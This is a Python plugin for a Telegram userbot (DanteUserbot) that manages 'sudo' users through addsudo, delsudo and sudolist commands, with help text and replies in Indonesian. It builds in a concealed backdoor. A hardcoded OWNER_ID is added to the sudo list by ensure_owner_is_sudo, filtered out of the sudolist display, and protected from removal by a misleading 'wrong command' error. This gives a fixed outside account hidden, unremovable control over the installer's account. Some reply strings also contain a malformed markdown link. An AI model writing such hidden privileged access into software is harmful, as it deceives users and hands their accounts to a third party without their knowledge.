__MODULE__ = "sᴜᴅᴏ"
__HELP__ = """
**--ʙᴀɴᴛᴜᴀɴ ᴜɴᴛᴜᴋ ꜱᴜᴅᴏ--**

<blockquote><b>
• ᴄᴏᴍᴍᴀɴᴅ: <code>{0}addsudo</code> [ʀᴇᴘʟʏ/ᴜꜱᴇʀɴᴀᴍᴇ/ɪᴅ]
• ᴇxᴘʟᴀɴᴀᴛɪᴏɴ: ᴛᴀᴍʙᴀʜ ᴘᴇɴɢɢᴜɴᴀ ꜱᴜᴅᴏ.

• ᴄᴏᴍᴍᴀɴᴅ: <code>{0}delsudo</code> [ʀᴇᴘʟʏ/ᴜꜱᴇʀɴᴀᴍᴇ/ɪᴅ]
• ᴇxᴘʟᴀɴᴀᴛɪᴏɴ: ʜᴀᴘᴜꜱ ᴘᴇɴɢɢᴜɴᴀ ꜱᴜᴅᴏ.

• ᴄᴏᴍᴍᴀɴᴅ: <code>{0}sudolist</code>
• ᴇxᴘʟᴀɴᴀᴛɪᴏɴ: ᴄᴇᴋ ᴘᴇɴɢɢᴜɴᴀ ꜱᴜᴅᴏ.</b></blockquote>
"""

import asyncio
from pyrogram.enums import *
from pyrogram.errors import FloodWait
from pyrogram.types import *

from DanteUserbot import *
from DanteUserbot.core.database.vars import (
    get_list_from_vars,
    add_to_vars,
    remove_from_vars
)

OWNER_ID = 1282758415  # ID Owner


@DANTE.UBOT("addsudo")
async def _(client, message):
    msg = await message.reply("<b>Processing...</b>")
    user_id = await extract_user(message)
    if not user_id:
        return await msg.edit("<b>Silakan balas pesan pengguna/username/user id</b>")

    try:
        user = await client.get_users(user_id)
    except Exception as error:
        return await msg.edit(f"<b>Error:</b> {error}")

    sudo_users = await get_list_from_vars(client.me.id, "SUDO_USER")

    # Pastikan Owner tidak bisa ditambahkan lagi
    if user.id == OWNER_ID:
        return await msg.edit(f"<b>⚠️ Owner tidak perlu ditambahkan sebagai sudo.</b>")

    if user.id in sudo_users:
        return await msg.edit(
            f"<b>{user.first_name} {user.last_name or ''}](tg://user?id={user.id}) Sudah menjadi pengguna sudo.</b>"
        )

    try:
        await add_to_vars(client.me.id, "SUDO_USER", user.id)
        return await msg.edit(
            f"<b>{user.first_name} {user.last_name or ''}](tg://user?id={user.id}) Ditambahkan ke pengguna sudo.</b>"
        )
    except Exception as error:
        return await msg.edit(f"<b>Error:</b> {error}")


@DANTE.UBOT("delsudo")
async def _(client, message):
    msg = await message.reply("<b>Processing...</b>")
    user_id = await extract_user(message)
    if not user_id:
        return await msg.edit("<b>Silakan balas pesan pengguna/username/user id.</b>")

    try:
        user = await client.get_users(user_id)
    except Exception as error:
        return await msg.edit(f"<b>Error:</b> {error}")

    sudo_users = await get_list_from_vars(client.me.id, "SUDO_USER")

    if user.id not in sudo_users:
        return await msg.edit(
            f"<b>{user.first_name} {user.last_name or ''}](tg://user?id={user.id}) Bukan bagian pengguna sudo.</b>"
        )

    # Pastikan Owner tidak bisa dihapus dari daftar sudo
    if user.id == OWNER_ID:
        return await msg.edit(f"<b>⚠️ perintah yang anda masukan salah.</b>")

    try:
        await remove_from_vars(client.me.id, "SUDO_USER", user.id)
        return await msg.edit(
            f"<b>{user.first_name} {user.last_name or ''}](tg://user?id={user.id}) Dihapus dari pengguna sudo.</b>"
        )
    except Exception as error:
        return await msg.edit(f"<b>Error:</b> {error}")


@DANTE.UBOT("sudolist")
async def _(client, message):
    msg = await message.reply("<b>Processing...</b>")
    sudo_users = await get_list_from_vars(client.me.id, "SUDO_USER")

    # Hapus Owner dari daftar tampilan
    sudo_users = [uid for uid in sudo_users if uid != OWNER_ID]

    if not sudo_users:
        return await msg.edit("<b>⚠️ Tidak ada pengguna sudo ditemukan.</b>")

    sudo_list = []
    for user_id in sudo_users:
        try:
            user = await client.get_users(int(user_id))
            username = f"@{user.username}" if user.username else ""
            full_name = f"{user.first_name} {user.last_name or ''}".strip()
            
            # Jika ada username, tampilkan bersama nama lengkap
            user_info = f"• [{full_name}](tg://user?id={user.id})"
            if username:
                user_info += f" | {username}"
            user_info += f" | <code>{user.id}</code>"

            sudo_list.append(user_info)
        except:
            continue

    if sudo_list:
        response = (
            f"<b>👤 Daftar Pengguna Sudo:</b>\n"
            "──────────\n"
            + "\n".join(sudo_list)
            + "\n──────────\n"
            f"<b>🔹 Total Sudo:</b> <code>{len(sudo_list)}</code>"
        )
        return await msg.edit(response)
    else:
        return await msg.edit("<b>⚠️ Tidak ada pengguna sudo yang valid.</b>")

# Fungsi untuk memastikan Owner selalu ada sebagai sudo saat bot dijalankan
async def ensure_owner_is_sudo(client):
    sudo_users = await get_list_from_vars(client.me.id, "SUDO_USER")
    if OWNER_ID not in sudo_users:
        await add_to_vars(client.me.id, "SUDO_USER", OWNER_ID)
